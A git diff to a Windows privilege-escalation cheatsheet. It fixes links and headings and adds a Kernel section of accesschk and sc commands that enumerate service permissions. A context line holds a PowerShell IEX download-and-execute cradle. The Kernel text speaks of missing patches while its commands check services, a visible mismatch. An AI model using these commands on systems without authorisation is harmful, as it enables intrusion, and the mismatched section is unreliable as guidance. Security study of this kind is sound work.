@@ -15,7 +15,7 @@ description: "Windows PrivEsc cheatsheet"
   - [Unquoted Service Path](#unquoted-service-path)
   - [Registry](#registry)
   - [Executable file](#executable-file)
-  - [DLL Hijacking](dll-hijacking)
+  - [DLL Hijacking](#dll-hijacking)
 - [Password mining](#password-mining)
   - [Passwords stored by user](#passwords-stored-by-user)
   - [Registry](#registry)
@@ -45,7 +45,7 @@ python -m SimpleHTTPServer 8080
 python3 -m http.server 8080
 ```
 
-Below, I listed the different PrivEsc tools and files that I would generally have hosted through the SMB and HTTP server for quick access.
+Below, I listed the different PrivEsc tools and files that I would generally have hosted through the **SMB** and **HTTP** server for quick access.
 ```
 accesschk64.exe
 accesschk.exe
@@ -78,6 +78,19 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 ```
 
 # Kernel
+Missing patches are probably the easiest way to improve your privileges. However, this can make your target system unstable, so only use them when you are desperate, I recommend taking this route as a last resort as there are times when the system can corrupt and lead to problems when hacking the machine.  
+**Detect if vulnerable:** Get patchlevel and check for exploits
+```
+#Check for what services we have write access by specifying one of our user roles (also check for the power users group)
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Everyone" *
+
+#Check our permissions for one specific service
+accesschk.exe -ucqv daclsvc 
+
+#Check under what privileges a system runs 
+sc qc daclsvc 
+```
 
 # Services
 ## BinPath
@@ -90,7 +103,7 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 ## Registry
 ## Configuration Files
 # Registry
-## Auto>Run
+## AutoRun
 ## AllwaysInstallElevated
 # Scheduled Tasks
 # Hot Potato
